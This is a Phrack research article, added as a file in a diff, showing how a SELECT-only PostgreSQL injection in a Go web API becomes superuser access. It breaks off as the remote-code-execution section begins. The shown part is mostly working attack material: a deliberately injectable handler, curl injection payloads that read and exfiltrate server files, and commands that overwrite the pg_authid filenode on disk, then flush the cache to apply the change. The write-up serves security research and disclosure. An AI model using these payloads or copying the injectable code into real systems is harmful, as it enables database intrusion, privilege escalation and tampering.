@@ -1,0 +1,1899 @@
+                             ==Phrack Inc.==
+
+                Volume 0x10, Issue 0x47, Phile #0x08 of 0x11
+
+|=-----------------------------------------------------------------------=|
+|=-----------=[ World of SELECT-only PostgreSQL Injections: ]=-----------=|
+|=--------------------=[ (Ab)using the filesystem ]=---------------------=|
+|=-----------------------------------------------------------------------=|
+|=-------------------------=[ Maksym Vatsyk ]=---------------------------=|
+|=-----------------------------------------------------------------------=|
+
+-- Table of contents
+
+0 - Introduction
+1 - The SQLi that started it all
+    1.0 - Target info
+    1.1 - A rather trivial injection
+    1.2 - No stacked queries for you
+    1.3 - Abusing server-side lo_ functions
+    1.4 - Not (entirely) a superuser
+    1.5 - Looking for a privesc
+2 - PostgreSQL storage concepts
+    2.0 - Tables and Filenodes
+    2.1 - Filenode format
+    2.2 - Table metadata
+    2.3 - Cold and Hot Data storages
+    2.4 - Editing filenodes offline
+3 - Updating the PostgreSQL data without UPDATE
+    3.0 - Identifying target table
+    3.1 - Search for the associated Filenode
+    3.2 - Reading and downloading Filenode
+    3.3 - Extracting table metadata
+    3.4 - Making ourselves a superuser
+    3.5 - Flushing Hot storage
+4 - SELECT-only RCE
+    4.0 - Reading original postgresql.conf
+    4.1 - Choosing a parameter to exploit
+    4.2 - Compiling malicious library
+    4.3 - Uploading the stuff back to the server
+    4.4 - Reload successful
+5 - Conclusions
+6 - References
+7 - Source code
+
+
+--[ 0 - Introduction
+
+This article tells the story of how a failed attempt to exploit a basic
+SQL injection in a web API with the PostgreSQL DBMS quickly spiraled into
+3 months of researching database source code and (hopefully) helping to
+create several new techniques to pwn Postgres hosts in restrictive
+contexts. Let's get into the story, shall we?
+
+
+--[ 1 - The SQLi that started it all
+
+---[ 1.0 - Target info
+
+The target web app was written in the Golang Gin[0] framework and used
+PGX[1] as a DB driver. What is interesting about the application is the
+fact that it is a trusted public data repository - anyone can query all
+data. The updates, however, are limited to a trusted set of users.
+
+This means that getting a SELECT SQL injection will have no impact on the
+application, while DELETE and UPDATE ones will still be critical.
+
+Unfortunately, I am not allowed to disclose the source code of
+the original application, but it can be roughly boiled down to this
+example (with data and tables changed to something artificial):
+
+--------------------------------------------------------------------------
+package main
+
+import (
+    "context"
+    "fmt"
+    "log"
+    "net/http"
+
+    "github.com/gin-gonic/gin"
+    "github.com/jackc/pgx/v4/pgxpool"
+)
+
+var pool *pgxpool.Pool
+
+type Phrase struct {
+    ID   int    `json:"id"`
+    Text string `json:"text"`
+}
+
+func phraseHandler(c *gin.Context) {
+    phrases := []Phrase{}
+
+    phrase_id := c.DefaultQuery("id", "1")
+    query := fmt.Sprintf(
+        "SELECT id, text FROM phrases WHERE id=%s",
+        phrase_id
+    )
+
+    rows, err := pool.Query(context.Background(), query)
+    defer rows.Close()
+
+    if err != nil {
+        c.JSON(
+            http.StatusInternalServerError,
+            gin.H{"error": err.Error()}
+        )
+        return
+    }
+
+    for rows.Next() {
+        var phrase Phrase
+        err := rows.Scan(&phrase.ID, &phrase.Text)
+        if err != nil {
+            c.JSON(
+                http.StatusInternalServerError,
+                gin.H{"error": err.Error()}
+            )
+            return
+        }
+        phrases = append(phrases, phrase)
+    }
+
+    c.JSON(http.StatusOK, phrases)
+}
+
+func main() {
+    pool, _ = pgxpool.Connect(
+        context.Background(),
+        "postgres://localhost/postgres?user=poc_user&password=poc_pass")
+
+    r := gin.Default()
+    r.GET("/phrases", phraseHandler)
+    r.Run(":8000")
+
+    defer pool.Close()
+}
+--------------------------------------------------------------------------
+
+
+---[ 1.1 - A rather trivial injection
+
+The actual injection happens inside the phraseHandler function on these
+lines of code. The app directly formats the query parameter id into
+the query string and calls the pool.Query() function. It couldn't be any
+simpler, right?
+
+--------------------------------------------------------------------------
+phrase_id := c.DefaultQuery("id", "1")
+query := fmt.Sprintf(
+    "SELECT id, text FROM phrases WHERE id=%s",
+    phrase_id
+)
+
+rows, err := pool.Query(context.Background(), query)
+defer rows.Close()
+--------------------------------------------------------------------------
+
+
+The SQL injection can be quickly confirmed with these cURL requests:
+
+--------------------------------------------------------------------------
+$ curl -G "http://172.23.16.127:8000/phrases" --data-urlencode "id=1"
+[
+    {"id":1,"text":"Hello, world!"}
+]
+
+$ curl -G "http://172.23.16.127:8000/phrases" --data-urlencode "id=-1"
+[]
+
+$ curl -G "http://172.23.16.127:8000/phrases" --data-urlencode "id=-1 OR 1=1"
+[
+    {"id":1,"text":"Hello, world!"},
+    {"id":2,"text":"A day in paradise."},
+    ...
+    {"id":14,"text":"Find your inner peace."},
+    {"id":15,"text":"Dance in the rain"}
+]
+--------------------------------------------------------------------------
+
+At this moment, our SQL query will look something like:
+
+--------------------------------------------------------------------------
+SELECT id, text FROM phrases WHERE id=-1 OR 1=1
+--------------------------------------------------------------------------
+
+Luckily for us, PostgreSQL drivers should easily support stacked queries,
+opening a wide range of attack vectors for us. We should be able to append
+additional queries separated by a semicolon like:
+
+--------------------------------------------------------------------------
+SELECT id, text FROM phrases WHERE id=-1; SELECT pg_sleep(5);
+--------------------------------------------------------------------------
+
+
+Let's just try it... Oh no, what is that?
+
+--------------------------------------------------------------------------
+$ curl -G "http://172.23.16.127:8000/phrases" \
+--data-urlencode "id=-1; SELECT pg_sleep(5)"
+{
+    "error":"ERROR: cannot insert multiple commands into a prepared
+                statement (SQLSTATE 42601)"
+}
+--------------------------------------------------------------------------
+
+
+---[ 1.1 - No stacked queries for you
+
+It turns out that the PGX developers decided to **secure** driver use
+by converting any SQL query to a prepared statement under the hood.
+
+This is done to disable any stacked queries whatsoever[2]. It works
+because the the PostgreSQL database itself does not allow multiple queries
+inside a single prepared statement[3].
+
+So, we are suddenly constrained to a single SELECT query! The DBMS will
+reject any stacked queries, and nested UPDATE or DELETE queries are also
+prohibited by the SQL syntax.
+
+--------------------------------------------------------------------------
+$ curl -G "http://172.23.16.127:8000/phrases" --data-urlencode \
+"id=-1 OR (UPDATE * phrases SET text='lol')"
+{
+    "error":"ERROR: syntax error at or near \"SET\" (SQLSTATE 42601)"
+}
+
+$ curl -G "http://172.23.16.127:8000/phrases" --data-urlencode \
+"id=-1 OR (DELETE * FROM phrases)"
+{
+    "error":"ERROR: syntax error at or near \"FROM\" (SQLSTATE 42601)"
+}
+--------------------------------------------------------------------------
+
+
+Nested SELECT queries are still possible, though!
+
+--------------------------------------------------------------------------
+$ curl -G "http://172.23.16.127:8000/phrases" --data-urlencode \
+"id=-1 OR (SELECT 1)=1"
+[
+    {"id":1,"text":"Hello, world!"},
+    ...
+    {"id":14,"text":"Find your inner peace."},
+    {"id":15,"text":"Dance in the rain"}
+]
+--------------------------------------------------------------------------
+
+
+Since one can read the DB data without the SQLi, is this bug even worth
+reporting?
+
+
+---[ 1.2 - Abusing server-side lo_ functions
+
+Not all hope is lost, though! Since nested SELECT SQL queries are allowed,
+we can try to call some of the built-in PostgreSQL functions and see if
+there are any that can help us.
+
+PostgreSQL has several functions that allow reading files from and writing
+to the server running the DBMS. These functions[4] are a part of the
+PostgreSQL Large Objects functionality, and should be accessible
+to the superusers by default:
+
+1. lo_import(path_to_file, lo_id) - read the file into the DB large object
+2. lo_export(lo_id, path_to_file) - dump the large object into a file
+
+What files can be read? Since the DBMS is normally running under the
+postgres user, we can search for readable files via the following
+command:
+
+--------------------------------------------------------------------------
+$ cat /etc/passwd | grep postgres
+postgres:x:129:129::/var/lib/postgresql:/bin/bash
+
+$ find / -uid 129 -type f -perm -600 2>/dev/null
+...
+/var/lib/postgresql/data/postgresql.conf       <---- main service config
+/var/lib/postgresql/data/pg_hba.conf           <---- authentication config
+/var/lib/postgresql/data/pg_ident.conf         <---- psql username mapping
+...
+/var/lib/postgresql/13/main/base/1/2654        <---- some data files
+/var/lib/postgresql/13/main/base/1/2613
+--------------------------------------------------------------------------
+
+
+There already is an RCE technique, initially discovered by Denis
+Andzakovic[5] and sylsTyping[6] in 2021 and 2022, which takes advantage
+of the postgresql.conf file.
+
+It involves overwriting the config file and either waiting for the server
+to reboot or forcefully reloading the configuration via the
+pg_reload_conf() PostgreSQL function[7].
+
+We will return to this matter later in the article. For now, let's just
+check if we have the permissions to call every function mentioned above.
+
+Calling lo_ functions:
+--------------------------------------------------------------------------
+$ curl -G "http://172.23.16.127:8000/phrases" --data-urlencode \
+"id=-1 UNION SELECT 1337, CAST((SELECT lo_import('/var/lib/postgresql/data/postgresql.conf', 31337)) AS text)"
+[
+    {"id":1337,"text":"31337"}
+]
+
+$ curl -G "http://172.23.16.127:8000/phrases" --data-urlencode \
+"id=-1 UNION SELECT 1337, CAST((SELECT lo_get(31337)) AS text)"
+[
+    {"id":1337,"text":"\\x23202d2d2d...72650a"}
+]
+--------------------------------------------------------------------------
+
+
+Large object functions work just fine! We've imported a file into the DB
+and consequently read it from the object with ID 31337.
+
+
+Calling pg_reload_conf function:
+--------------------------------------------------------------------------
+$ curl -G "http://172.23.16.127:8000/phrases" --data-urlencode \
+"id=-1 UNION SELECT 1337, CAST((SELECT pg_reload_conf()) AS text)"
+[]
+--------------------------------------------------------------------------
+
+
+There is a problem with the pg_reload_conf function, however. In success
+cases, it should return a row with the text "true".
+
+Why can we call large object functions but not pg_reload_conf?
+Shouldn't they both be accessible to a superuser?
+
+
+---[ 1.3 - Not (entirely) a superuser
+
+They should, but we happen to not be one. Our test user has explicit
+permissions over the large object functions but lacks access to anything
+else. The permissions should be similar to the below example
+configuration:
+
+--------------------------------------------------------------------------
+CREATE USER poc_user WITH PASSWORD 'poc_pass'
+
+GRANT pg_read_server_files TO poc_user
+GRANT pg_write_server_files TO poc_user
+
+GRANT USAGE ON SCHEMA public TO poc_user
+GRANT SELECT, INSERT, UPDATE, DELETE ON TABLE pg_largeobject TO poc_user
+
+GRANT EXECUTE ON FUNCTION lo_export(oid, text) TO poc_user
+GRANT EXECUTE ON FUNCTION lo_import(text, oid) TO poc_user
+--------------------------------------------------------------------------
+
+
+---[ 1.4 - Looking for a privesc
+
+If we want to perform RCE through the configuration file reliably, we must
+find a way to become a superuser and call pg_reload_conf(). Unlike the
+popular topic of PostgreSQL RCE techniques, there is not a whole lot of
+information about privilege escalation from within the DB.
+
+Luckily for us, the official documentation page for Large Object functions
+gives us some clues for the next steps[4]:
+
+> It is possible to GRANT use of the server-side lo_import and lo_export
+> functions to non-superusers, but careful consideration of the security
+> implications is required. A malicious user of such privileges could
+> easily parlay them into becoming superuser (for example by rewriting
+> server configuration files)
+
+What if we were to modify the PostgreSQL table data directly, on disk,
+without any UPDATE queries at all?
+
+
+--[ 2 - PostgreSQL storage concepts
+
+---[ 2.0 - Tables and Filenodes
+
+PostgreSQL has extremely complex data flows to optimize resource usage and
+eliminate possible data access conflicts, e.g. race conditions. You can
+read about them in great detail in the official documentation[8][9].
+
+The physical data layout significantly differs from the widely known
+"table" and "row" objects. All data is stored on disk in a Filenode object
+named with the OID of the respective pg_class object.
+
+In other words, each table has its Filenode. We can lookup the OID and
+respective Filenode names of a given table through the following queries:
+
+--------------------------------------------------------------------------
+SELECT oid FROM pg_class WHERE relname='TABLE_NAME'
+// OR
+SELECT pg_relation_filepath('TABLE_NAME');
+--------------------------------------------------------------------------
+
+
+All of the filenodes are stored in the PostgreSQL data directory. The path
+to which can be queried from the pg_settings table by superusers:
+
+--------------------------------------------------------------------------
+SELECT setting FROM pg_settings WHERE name = 'data_directory';
+--------------------------------------------------------------------------
+
+
+However, this value should generally be the same across different
+installations of the DBMS and can be easily guessed by a third party.
+
+A common path for PostgreSQL data directories on Debian systems is
+"/var/lib/postgresql/MAJOR_VERSION/CLUSTER_NAME/".
+
+We can obtain the major version by running a "SELECT version()" query in
+the SQLi. The default value of CLUSTER_NAME is "main".
+
+An example path of a filenode for our "phrases" would be:
+--------------------------------------------------------------------------
+=== in psql ===
+
+postgres=# SELECT pg_relation_filepath('phrases');
+ pg_relation_filepath
+----------------------
+ base/13485/65549
+(1 row)
+
+postgres=# SELECT version();
+                                                               version
+-------------------------------------------------------------------------------------------------------------------------------------
+ PostgreSQL 13.13 (Ubuntu 13.13-1.pgdg22.04+1) on x86_64-pc-linux-gnu, compiled by gcc (Ubuntu 11.4.0-1ubuntu1~22.04) 11.4.0, 64-bit
+(1 row)
+
+=== in bash ===
+
+$ ll /var/lib/postgresql/13/main/base/13485/65549
+-rw------- 1 postgres postgres 8192 mar 14 13:45 /var/lib/postgresql/13/main/base/13485/65549
+--------------------------------------------------------------------------
+
+
+So: all of the files with numeric names, found in section 1.2, are in
+fact separate table filenodes that the postgres user can read and write!
+
+
+---[ 2.1 - Filenode format
+
+A Filenode is a binary file composed of separate chunks of 0x2000 bytes
+called Pages. Each page holds the actual row data within nested Item
+objects. The layout of each Filenode can be summarized with the below
+diagram:
+
+   +----------+
+   | Filenode |
+   +----------+-------------------------------------------------------+
+   |                                                                  |
+   |   +--------+                                                     |
+   |   | Page 1 |                                                     |
+   |   +--------+----+---------+---------+-----+---------+--------+   |
+   |   | Page Header |Item ID 1|Item ID 2| ... |Item ID n|        |   |
+   |   +-------------+----+----+---------+     +----+----+        |   |
+   |   |                  |                         |             |   |
+   |   |                  +-------------------------+--------+    |   |
+   |   |                                            |        |    |   |
+   |   |      +-------------------------------------+        |    |   |
+   |   |      |                                              |    |   |
+   |   |      |    ... empty space padded with 0x00 ...      |    |   |
+   |   |      |                                              |    |   |
+   |   |      +----------------------+                       |    |   |
+   |   |                             |                       |    |   |
+   |   |                             v                       v    |   |
+   |   |                         +--------+     +--------+--------+   |
+   |   |                         | Item n | ... | Item 2 | Item 1 |   |
+   |   +-------------------------+--------+-----+--------+--------+   |
+   |   ...                                                            |
+   |   +--------+                                                     |
+   |   | Page n |                                                     |
+   |   +--------+                                                     |
+   |   ...                                                            |
+   |                                                                  |
+   +------------------------------------------------------------------+
+
+
+---[ 2.2 - Table metadata
+
+It is worth noting that the Item objects are stored in the binary format
+and cannot be manipulated directly. One must first deserialize them using
+metadata from the internal PostgreSQL "pg_attribute" table. We can query
+Item metadata using the following SQL query:
+
+--------------------------------------------------------------------------
+SELECT
+    STRING_AGG(
+        CONCAT_WS(
+            ',',
+            attname,
+            typname,
+            attlen,
+            attalign
+        ),
+        ';'
+    )
+FROM pg_attribute
+    JOIN pg_type
+        ON pg_attribute.atttypid = pg_type.oid
+    JOIN pg_class
+        ON pg_attribute.attrelid = pg_class.oid
+WHERE pg_class.relname = 'TABLE_NAME';
+--------------------------------------------------------------------------
+
+
+---[ 2.3 - Cold and Hot data storage
+
+All of the above objects make up the DBMS' cold storage. To access the
+data in cold storage through a query, Postgres must first load it in the
+RAM cache, a.k.a. hot storage.
+
+The following diagram shows a rough and simplified flow of how the
+PostgreSQL accesses the data:
+
+  +------------------+       +--------+       +------+        +------+
+  |Table in RAM cache|------>|Filenode|--+--->|Page 1|---+--->|Item 1|
+  +------------------+       +--------+  |    +------+   |    +------+
+                                         |               |
+                                         |    +------+   |    +------+
+                                         +--->|Page 2|   +--->|Item 2|
+                                         |    +------+   |    +------+
+                                         |     ...       |     ...
+                                         |    +------+   |    +------+
+                                         +--->|Page n|   +--->|Item n|
+                                              +------+        +------+
+
+
+The DBMS periodically flushes any changes to the data in hot storage to
+the filesystem.
+
+These syncs may pose a challenge to us! Since we can only edit the cold
+storage of a running database, we risk subsequent hot storage syncs
+overwriting our edits. Thus, we must ensure that the table we want to
+overwrite has been offloaded from the cache.
+
+--------------------------------------------------------------------------
+# -----------------------------
+# PostgreSQL configuration file
+# -----------------------------
+...
+# - Memory -
+
+shared_buffers = 128MB          # min 128kB
+                                # (change requires restart)
+...
+--------------------------------------------------------------------------
+
+
+The default cache size is 128MB. So, if we stress the DB with expensive
+queries to other tables/large objects before the flush, we might overflow
+the cache and clear our target table from it.
+
+
+---[ 2.4 - Editing filenodes offline
+
+I've created a tool to parse and modify data stored in filenodes, which
+functions independently of the Postgres server that created the filenodes.
+We can use it to overwrite target table rows with our desired values.
+
+The editor supports both datatype-assisted and raw parsing modes. The
+assisted mode is the preferred option as it allows you to edit the data
+safely, without accidentally messing up the whole filenode structure.
+
+The actual parsing implementation is way too lengthy to discuss in this
+article, but you can find the sources on GitHub[10], or the source code
+in this article if reading online, if you want to dig deeper into it.
+
+You can also check out this article[12] on parsing filenodes in Golang.
+
+
+--[ 3 - Updating the PostgreSQL data without UPDATE
+
+---[ 3.0 - Identifying target table
+
+So, we are looking to escalate our permissions to those of a DBMS
+superuser. Which table should we aim to modify? All Postgres permissions
+are stored in the internal table "pg_authid". All CREATE/DROP/ALTER
+statements for new roles and users actually modify this table under the
+hood. Let's inspect it in a PSQL session under the default super-admin
+user:
+
+--------------------------------------------------------------------------
+postgres=# SELECT * FROM pg_authid; \x
+-[ RECORD 1 ]--+------------------------------------
+oid            | 3373
+rolname        | pg_monitor
+rolsuper       | f
+rolinherit     | t
+rolcreaterole  | f
+rolcreatedb    | f
+rolcanlogin    | f
+rolreplication | f
+rolbypassrls   | f
+rolconnlimit   | -1
+rolpassword    | 
+rolvaliduntil  | 
+... TRUNCATED ... 
+-[ RECORD 9 ]--+------------------------------------
+oid            | 10
+rolname        | postgres
+rolsuper       | t
+rolinherit     | t
+rolcreaterole  | t
+rolcreatedb    | t
+rolcanlogin    | t
+rolreplication | t
+rolbypassrls   | t
+rolconnlimit   | -1
+rolpassword    |
+rolvaliduntil  | 
+-[ RECORD 10 ]-+------------------------------------
+oid            | 16386
+rolname        | poc_user
+rolsuper       | f
+rolinherit     | t
+rolcreaterole  | f
+rolcreatedb    | f
+rolcanlogin    | t
+rolreplication | f
+rolbypassrls   | f
+rolconnlimit   | -1
+rolpassword    | md58616944eb80b569f7be225c2442582cd
+rolvaliduntil  |
+--------------------------------------------------------------------------
+
+
+The table contains a bunch of "rol" boolean flags and other interesting
+stuff, like the MD5 hashes of the user logon passwords. The default
+superadmin user "postgres" has all boolean flags set to true.
+
+To become a superuser, we must flip all boolean fields to True for our
+user, "poc_user".
+
+
+---[ 3.1 - Search for the associated Filenode
+
+To modify the table, we must first locate and read the filenode from the
+disk. As discussed previously, we won't be able to get the data directory
+setting from the DBMS, as we lack permissions to read the "pg_settings"
+table:
+
+--------------------------------------------------------------------------
+$ curl -G "http://172.23.16.127:8000/phrases" --data-urlencode \
+"id=-1 UNION SELECT 1337, (SELECT setting FROM pg_settings WHERE name='data_directory')"
+{
+    "error":"can't scan into dest[1]: cannot scan null into *string"
+}
+--------------------------------------------------------------------------
+
+
+However, we can reliably guess the data directory path by querying the
+version of the DBMS:
+
+--------------------------------------------------------------------------
+$ curl -G "http://172.23.16.127:8000/phrases" --data-urlencode \
+"id=-1 UNION SELECT 1337, (SELECT version())"
+[
+    {"id":1337,"text":"PostgreSQL 13.13 (Ubuntu 13.13-1.pgdg22.04+1) on x86_64-pc-linux-gnu, compiled by gcc (Ubuntu 11.4.0-1ubuntu1~22.04) 11.4.0, 64-bit"}
+]
+--------------------------------------------------------------------------
+
+
+Version information gives us more than enough knowledge about the DBMS
+and the underlying server. We can simply install a major version of
+PostgreSQL release 13 on our own Ubuntu 22 VM and find that the data
+directory is "/var/lib/postgresql/13/main":
+
+--------------------------------------------------------------------------
+ubuntu@ubuntu-virtual-machine:~$ uname -a
+Linux ubuntu-virtual-machine 6.5.0-14-generic #14~22.04.1-Ubuntu SMP PREEMPT_DYNAMIC Mon Nov 20 18:15:30 UTC 2 x86_64 x86_64 x86_64 GNU/Linux
+ubuntu@ubuntu-virtual-machine:~$ sudo su postgres
+postgres@ubuntu-virtual-machine:~$ pwd
+/var/lib/postgresql
+postgres@ubuntu-virtual-machine:~$ ls -l 13/main/
+total 84
+drwx------ 5 postgres postgres 4096 lis 26 14:48 base
+drwx------ 2 postgres postgres 4096 mar 15 11:56 global
+drwx------ 2 postgres postgres 4096 lis 26 14:48 pg_commit_ts
+drwx------ 2 postgres postgres 4096 lis 26 14:48 pg_dynshmem
+drwx------ 4 postgres postgres 4096 mar 15 11:55 pg_logical
+drwx------ 4 postgres postgres 4096 lis 26 14:48 pg_multixact
+drwx------ 2 postgres postgres 4096 lis 26 14:48 pg_notify
+drwx------ 2 postgres postgres 4096 lis 26 14:48 pg_replslot
+drwx------ 2 postgres postgres 4096 lis 26 14:48 pg_serial
+drwx------ 2 postgres postgres 4096 lis 26 14:48 pg_snapshots
+drwx------ 2 postgres postgres 4096 mar 11 00:45 pg_stat
+drwx------ 2 postgres postgres 4096 lis 26 14:48 pg_stat_tmp
+drwx------ 2 postgres postgres 4096 lis 26 14:48 pg_subtrans
+drwx------ 2 postgres postgres 4096 lis 26 14:48 pg_tblspc
+drwx------ 2 postgres postgres 4096 lis 26 14:48 pg_twophase
+-rw------- 1 postgres postgres    3 lis 26 14:48 PG_VERSION
+drwx------ 3 postgres postgres 4096 lut  4 00:22 pg_wal
+drwx------ 2 postgres postgres 4096 lis 26 14:48 pg_xact
+-rw------- 1 postgres postgres   88 lis 26 14:48 postgresql.auto.conf
+-rw------- 1 postgres postgres  130 mar 15 11:55 postmaster.opts
+-rw------- 1 postgres postgres  100 mar 15 11:55 postmaster.pid
+--------------------------------------------------------------------------
+
+
+With the data directory path obtained, we can query the relative path to
+the "pg_authid" Filenode. Thankfully, there are no permission issues this
+time.
+
+--------------------------------------------------------------------------
+$ curl -G "http://172.23.16.127:8000/phrases" --data-urlencode \
+"id=-1 UNION SELECT 1337, (SELECT pg_relation_filepath('pg_authid'))"
+[
+    {"id":1337,"text":"global/1260"}
+]
+--------------------------------------------------------------------------
+
+
+With all the information in our hands, we can assume that the "pg_authid"
+Filenode is located at "/var/lib/postgresql/13/main/global/1260".
+
+Let's download it to our local machine from the target server.
+
+
+---[ 3.2 - Reading and downloading the Filenode
+
+We can now quickly download the file as a base64 string through the
+Large Object functions "lo_import" and "lo_get" in the following steps:
+--------------------------------------------------------------------------
+$ curl -G "http://172.23.16.127:8000/phrases" --data-urlencode \
+"id=-1 UNION SELECT 1337,CAST((SELECT lo_import('/var/lib/postgresql/13/main/global/1260', 331337)) AS text)"
+[
+    {"id":1337,"text":"331337"}
+]
+
+$ curl -G "http://172.23.16.127:8000/phrases" --data-urlencode \
+"id=-1 UNION SELECT 1337,translate(encode(lo_get(331337), 'base64'), E'\n', '')" | jq ".[].text" -r | base64 -d > pg_authid_filenode
+--------------------------------------------------------------------------
+
+
+After decoding the Base64 into a file, we can confirm that we indeed
+successfully downloaded the "pg_authid" Filenode by comparing the hashes.
+
+--------------------------------------------------------------------------
+=== on the attacker server ===
+$ md5sum pg_authid_filenode
+4c9514c6fb515907b75b8ac04b00f923  pg_authid_filenode
+
+=== on the target server ===
+postgres@ubuntu-virtual-machine:~$ md5sum /var/lib/postgresql/13/main/global/1260
+4c9514c6fb515907b75b8ac04b00f923  /var/lib/postgresql/13/main/global/1260
+--------------------------------------------------------------------------
+
+
+---[ 3.3 - Extracting table metadata
+
+One last step before parsing the downloaded Filenode -- we must get its
+metadata from the server via the following SQLi query:
+
+--------------------------------------------------------------------------
+$ curl -G "http://172.23.16.127:8000/phrases" --data-urlencode \
+"id=-1 UNION SELECT 1337,STRING_AGG(CONCAT_WS(',',attname,typname,attlen,attalign),';') FROM pg_attribute JOIN pg_type ON pg_attribute.atttypid = pg_type.oid JOIN pg_class ON pg_attribute.attrelid = pg_class.oid WHERE pg_class.relname = 'pg_authid'"
+[
+    {"id":1337,"text":"tableoid,oid,4,i;cmax,cid,4,i;xmax,xid,4,i;cmin,cid,4,i;xmin,xid,4,i;ctid,tid,6,s;oid,oid,4,i;rolname,name,64,c;rolsuper,bool,1,c;rolinherit,bool,1,c;rolcreaterole,bool,1,c;rolcreatedb,bool,1,c;rolcanlogin,bool,1,c;rolreplication,bool,1,c;rolbypassrls,bool,1,c;rolconnlimit,int4,4,i;rolpassword,text,-1,i;rolvaliduntil,timestamptz,8,d"}
+]
+--------------------------------------------------------------------------
+
+
+We should now be able to use our in-house Python3 Filenode editor to list
+the data and confirm it is intact. The output for the "rolname" field will
+be a bit ugly, because for some reason this field is stored in a 64-byte
+fixed-length string padded with null bytes, instead of the common varchar
+type:
+
+--------------------------------------------------------------------------
+$ python3 postgresql_filenode_editor.py \
+-f ./pg_authid_filenode \
+-m list \
+--datatype-csv "tableoid,oid,4,i;cmax,cid,4,i;xmax,xid,4,i;cmin,cid,4,i;xmin,xid,4,i;ctid,tid,6,s;oid,oid,4,i;rolname,name,64,c;rolsuper,bool,1,c;rolinherit,bool,1,c;rolcreaterole,bool,1,c;rolcreatedb,bool,1,c;rolcanlogin,bool,1,c;rolreplication,bool,1,c;rolbypassrls,bool,1,c;rolconnlimit,int4,4,i;rolpassword,text,-1,i;rolvaliduntil,timestamptz,8,d"
+
+ [+] Page 0:
+--------- item no. 0 ---------
+oid           : 10
+rolname       : b'postgres\x00...'
+rolsuper      : 1
+rolinherit    : 1
+rolcreaterole : 1
+rolcreatedb   : 1
+rolcanlogin   : 1
+rolreplication: 1
+rolbypassrls  : 1
+rolconnlimit  : -1
+rolpassword   : None
+
+--------- item no. 1 ---------
+oid           : 3373
+rolname       : b'pg_monitor\x00...'
+rolsuper      : 0
+rolinherit    : 1
+rolcreaterole : 0
+rolcreatedb   : 0
+rolcanlogin   : 0
+rolreplication: 0
+rolbypassrls  : 0
+rolconnlimit  : -1
+rolpassword   : None
+... TRUNCATED ...
+--------- item no. 9 ---------
+oid           : 16386
+rolname       : b'poc_user\x00...'
+rolsuper      : 0
+rolinherit    : 1
+rolcreaterole : 0
+rolcreatedb   : 0
+rolcanlogin   : 1
+rolreplication: 0
+rolbypassrls  : 0
+rolconnlimit  : -1
+rolpassword   : b'md58616944eb80b569f7be225c2442582cd'
+--------------------------------------------------------------------------
+
+
+---[ 3.4 - Making ourselves a superuser
+
+We can now use the Filenode editor to update Item no. 9, which contains
+the entry for "poc_user". For convenience, we can pass any non-printable
+fields (such as the "rolname" field) as base64 string. We will flip all
+"rol" flags to 1 with the following editor command:
+
+--------------------------------------------------------------------------
+$ python3 postgresql_filenode_editor.py \
+-f ./pg_authid_filenode \
+-m update \
+-p 0 \
+-i 9 \
+--datatype-csv "tableoid,oid,4,i;cmax,cid,4,i;xmax,xid,4,i;cmin,cid,4,i;xmin,xid,4,i;ctid,tid,6,s;oid,oid,4,i;rolname,name,64,c;rolsuper,bool,1,c;rolinherit,bool,1,c;rolcreaterole,bool,1,c;rolcreatedb,bool,1,c;rolcanlogin,bool,1,c;rolreplication,bool,1,c;rolbypassrls,bool,1,c;rolconnlimit,int4,4,i;rolpassword,text,-1,i;rolvaliduntil,timestamptz,8,d" \
+--csv-data "16386,cG9jX3VzZXIAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA==,1,1,1,1,1,1,1,-1,md58616944eb80b569f7be225c2442582cd,NULL"
+--------------------------------------------------------------------------
+
+
+The script will save the updated Filenode to a file with ".new" as an
+extension. We can now re-upload the data to the PostgreSQL server and
+overwrite the original data through the SQLi.
+
+--------------------------------------------------------------------------
+$ curl -G "http://172.23.16.127:8000/phrases" --data-urlencode \
+"id=-1 UNION SELECT 1337,CAST((SELECT lo_from_bytea(3331337, decode('$(base64 -w 0 pg_authid_filenode.new)', 'base64'))) AS text)"
+[
+    {"id":1337,"text":"3331337"}
+]
+
+$ curl -G "http://172.23.16.127:8000/phrases" --data-urlencode \
+"id=-1 UNION SELECT 1337,CAST((SELECT lo_export(3331337, '/var/lib/postgresql/13/main/global/1260')) AS text)"
+[{"id":1337,"text":"1"}]
+--------------------------------------------------------------------------
+
+
+So, we've just overwritten the Filenode on the disk! But the RAM cache
+still has the old data. We must find a way to flush it somehow:
+
+--------------------------------------------------------------------------
+postgres=# SELECT * FROM pg_authid WHERE rolname='poc_user'; \x
+-[ RECORD 1 ]--+------------------------------------
+oid            | 16386
+rolname        | poc_user
+rolsuper       | f
+rolinherit     | t
+rolcreaterole  | f
+rolcreatedb    | f
+rolcanlogin    | t
+rolreplication | f
+rolbypassrls   | f
+rolconnlimit   | -1
+rolpassword    | md58616944eb80b569f7be225c2442582cd
+rolvaliduntil  |
+--------------------------------------------------------------------------
+
+
+---[ 3.5 - Flushing Hot storage
+
+So, you may be wondering - how can we force the server to clean the RAM
+cache? How about creating a Large Object of a size matching the entire
+cache pool? :DDDDD
+
+--------------------------------------------------------------------------
+$ curl -G "http://172.23.16.127:8000/phrases" --data-urlencode \
+"id=-1 UNION SELECT 1337,CAST((SELECT lo_from_bytea(33331337, (SELECT REPEAT('a', 128*1024*1024))::bytea)) AS text)"
+[
+    {"id":1337,"text":"33331337"}
+]
+--------------------------------------------------------------------------
+
+
+The server took at least 5 seconds to process our query, which may
+indicate our success. Let's check our permissions again:
+
+--------------------------------------------------------------------------
+postgres=# SELECT * FROM pg_authid WHERE rolname='poc_user'; \x
+-[ RECORD 1 ]--+------------------------------------
+oid            | 16386
+rolname        | poc_user
+rolsuper       | t
+rolinherit     | t
+rolcreaterole  | t
+rolcreatedb    | t
+rolcanlogin    | t
+rolreplication | t
+rolbypassrls   | t
+rolconnlimit   | -1
+rolpassword    | md58616944eb80b569f7be225c2442582cd
+rolvaliduntil  |
+--------------------------------------------------------------------------
+
+
+Success! All "rol" flags were flipped to true! Can we reload the config
+now?
+
+--------------------------------------------------------------------------
+$ curl -G "http://172.23.16.127:8000/phrases" --data-urlencode \
+"id=-1 UNION SELECT 1337, CAST((SELECT pg_reload_conf()) AS text)"
+[
+    {"id":1337,"text":"true"}
+]
+--------------------------------------------------------------------------
+
+Notice that this query now returns a row with "text" set to "true",
+confirming that we are indeed able to reload the config now.
+
+That's more like it! We can now perform SELECT-only RCE.
+
+
+--[ 4 - SELECT-only RCE
+
+---[ 4.0 - Reading original postgresql.conf
+
+The first step in performing the RCE is to download the original config
+file. Since we are a super-admin now, we can query its path directly from
